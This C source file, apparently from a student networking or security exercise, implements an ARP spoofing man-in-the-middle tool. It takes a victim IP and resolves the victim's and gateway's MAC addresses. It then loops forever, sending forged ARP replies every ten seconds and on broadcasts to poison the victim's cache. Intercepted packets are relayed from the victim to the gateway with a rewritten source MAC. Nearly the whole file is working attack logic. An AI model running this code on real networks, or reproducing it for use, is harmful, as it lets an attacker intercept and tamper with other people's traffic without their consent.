#include "send_arp.h"

int main(int argc, char* argv[]){
	struct in_addr      myIp,	GWIp,	victimIp;
    struct ether_addr   myMac,	victimMac, GWMac;
    struct ether_addr	broadcastMac;
	pcap_t 		*pcd;					// packet descriptor
	char 		*device;				// device name
	FILE 		*fp;
	int 		i=0;
	char 		buf[20] = {0};
	const u_char* packet;
	
	// program usage
	if(argc != 2){
		printf("program usage: %s <victim ip>\n", argv[0]);
		return -1;
	}

	// check if the target ip is invalid
    if(inet_aton(argv[1], &victimIp) == 0){
        printf("No such IP : %s\n", argv[1]);
        return -1;
    }

    // broadcastMac initialization
    for(i=0;i<ETHER_ADDR_LEN;i++){
    	broadcastMac.ether_addr_octet[i] = 0xff;
    }

    /* FIRST SESSION for [victim(sender) > gateway(target)] */
    pcd_init(&pcd, &device);			// initialize the pcd
	getMyIpMac(&myMac, &myIp);			// get my ip, mac_address from ifconfig result
	getGWIp(&GWIp);						// get Gateway IP
	ARPrequest(victimIp, myMac, myIp, pcd);			// send ARP request to get victim MAC
	pcapCapture(&victimIp,  device, pcd, packet);	// get ARP reply, filtering it to get correct reply

	// read mac from the file to send ARP which will infect the victim
	fp = fopen("targetmac.txt", "r"); 
	if(fp == NULL){
		printf("file open error");
	}
	fgets(buf, sizeof(buf), fp);
	ether_aton_r(buf, &victimMac);
	fclose(fp);


	/* SECOND SESSION for [victim(gateway) > user(target)] */
	ARPrequest(GWIp, myMac, myIp, pcd);			// send ARP request to get victim MAC
	pcapCapture(&GWIp,  device, pcd, packet);	// get ARP reply, filtering it to get correct reply
	
	// read mac from the file to send ARP which will infect the victim
	fp = fopen("targetmac.txt", "r"); 
	if(fp == NULL){
		printf("file open error");
	}
	fgets(buf, sizeof(buf), fp);
	ether_aton_r(buf, &GWMac);
	fclose(fp);

	struct pcap_pkthdr *pkthdr;
	time_t start = 0, end = 0;
	double gap = 0;
	time(&start);
	
	while(1){
		int ispacket = 0;
		ispacket = pcap_next_ex(pcd, &pkthdr, &packet);
		if(ispacket < 0){
			printf("packet_next error\n");
			return 0;
		}
		else if(ispacket == 0)	continue;

		time(&end);
		if(difftime(end, start) >= 10){
			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
			//ARPreply(GWMac, GWIp, myMac, victimIp, pcd);
			time(&start);
			printf("time expired\n");
		}

		if( ( isbroadcast(packet, GWIp) ) || ( isbroadcast(packet, victimIp) ) ) {
			//sleep(1);	// after sender get the reply from the GW
			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
			//ARPreply(GWMac, GWIp, myMac, victimIp, pcd);
		}

		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
		pcap_from_victiom(victimIp, GWIp, GWMac, myMac, device, pcd, pkthdr, packet);
		//pcap_from_victiom(GWIp, victimIp, victimMac, device, pcd, packet);
	}
	pcap_close(pcd);

	return 1;
}